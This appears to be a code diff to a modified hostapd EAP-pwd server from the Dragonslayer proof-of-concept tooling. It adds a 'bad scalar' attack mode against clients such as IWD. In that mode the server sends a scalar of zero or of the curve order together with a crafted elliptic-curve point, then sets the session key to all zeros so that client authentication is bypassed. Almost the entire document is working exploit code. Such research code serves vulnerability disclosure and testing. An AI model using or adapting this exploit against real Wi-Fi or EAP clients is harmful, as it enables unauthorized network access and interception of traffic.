@@ -285,7 +285,7 @@ static void eap_pwd_build_commit_req(struct eap_sm *sm,
 
 /** Test if a scalar equal to zero or equal to the order is accepted */
 #ifdef DRAGONSLAYER
-	if (dragonslayer_invalidcurve || dragonslayer_invalidcurve_aruba)
+	if (dragonslayer_invalidcurve || dragonslayer_invalidcurve_aruba || dragonslayer_badscalar)
 	{
 		if (crypto_bignum_sub(crypto_ec_get_order(data->grp->group),
 			              data->private_value, mask) < 0 ||
@@ -298,22 +298,22 @@ static void eap_pwd_build_commit_req(struct eap_sm *sm,
 				   "EAP-pwd (peer): unable to force scalar to zero");
 			goto fin;
 		}
-	}
 
-	if (dragonslayer_invalidcurve_aruba)
-	{
-		if (crypto_bignum_add(data->my_scalar, crypto_ec_get_order(data->grp->group),
-				      data->my_scalar) < 0) {
-			poc_log(sm->peer_addr,
-				   "EAP-pwd (peer): unable to force scalar to order");
-			goto fin;
+		if (dragonslayer_invalidcurve_aruba /*|| dragonslayer_badscalar*/)
+		{
+			if (crypto_bignum_add(data->my_scalar, crypto_ec_get_order(data->grp->group),
+					      data->my_scalar) < 0) {
+				poc_log(sm->peer_addr,
+					   "EAP-pwd (peer): unable to force scalar to order\n");
+				goto fin;
+			}
+
+			poc_log(sm->peer_addr, "setting scalar equal to order of the curve\n");
 		}
-
-		poc_log(sm->peer_addr, "setting scalar equal to order of the curve\n\n\n");
-	}
-	else
-	{
-		poc_log(sm->peer_addr, "sending a scalar equal to zero\n");
+		else
+		{
+			poc_log(sm->peer_addr, "sending a scalar equal to zero\n");
+		}
 	}
 #endif // DRAGONSLAYER
 
@@ -370,6 +370,22 @@ static void eap_pwd_build_commit_req(struct eap_sm *sm,
 	{
 		poc_log(sm->peer_addr, "sending element at infinity (= zero element)\n");
 		memset(element, 0, prime_len * 2);
+	}
+	/** We send a specially crafted valid EC point towards IWD */
+	else if (dragonslayer_badscalar)
+	{
+		/** This element is a _valid_ one, so no need to load a new curve */
+		if (data->my_element != NULL)
+			crypto_ec_point_deinit(data->my_element, 0);
+		data->my_element = crypto_ec_point_get_zeroscalar_element(data->grp->group);
+
+		if (crypto_ec_point_to_bin(data->grp->group, data->my_element, element,
+					   element + prime_len) < 0) {
+			poc_log(sm->peer_addr, "Point assignment for bad scalar attack failed");
+			goto fin;
+		}
+
+		poc_log(sm->peer_addr, "Using special (valid) element\n");
 	}
 	/** Note: we cannot perform reflection attacks against the client */
 #endif // DRAGONSLAYER
@@ -460,11 +476,16 @@ static void eap_pwd_build_confirm_req(struct eap_sm *sm,
 			poc_log(sm->peer_addr, "ERROR: %s: failed to force invalid curve point\n", __FUNCTION__);
 			goto fin;
 		}
+
+		//poc_log(sm->peer_addr, "Calculating own confirm with as own element the generator of the subgroup\n", __FUNCTION__);
 	}
 	else if (dragonslayer_invalidcurve_aruba)
 	{
 		memset(cruft, 0, prime_len * 2);
+
+		poc_log(sm->peer_addr, "Calculating own confirm with as own element the point at infinity\n", __FUNCTION__);
 	}
+	/* dragonslayer_badscalar is handled automatically because data->my_element contains the specia point */
 #endif // DRAGONSLAYER
 	eap_pwd_h_update(hash, cruft, prime_len * 2);
 
@@ -868,7 +889,7 @@ eap_pwd_process_commit_resp(struct eap_sm *sm, struct eap_pwd_data *data,
 		}
 		poc_log(sm->peer_addr, "configured X-coordinate of subgroup generator as session key\n", __FUNCTION__);
 	}
-	else if (dragonslayer_invalidcurve_aruba)
+	else if (dragonslayer_invalidcurve_aruba || dragonslayer_badscalar)
 	{
 		crypto_bignum_setint(data->k, 0);
 		poc_log(sm->peer_addr, "configured all-zeros as session key\n", __FUNCTION__);
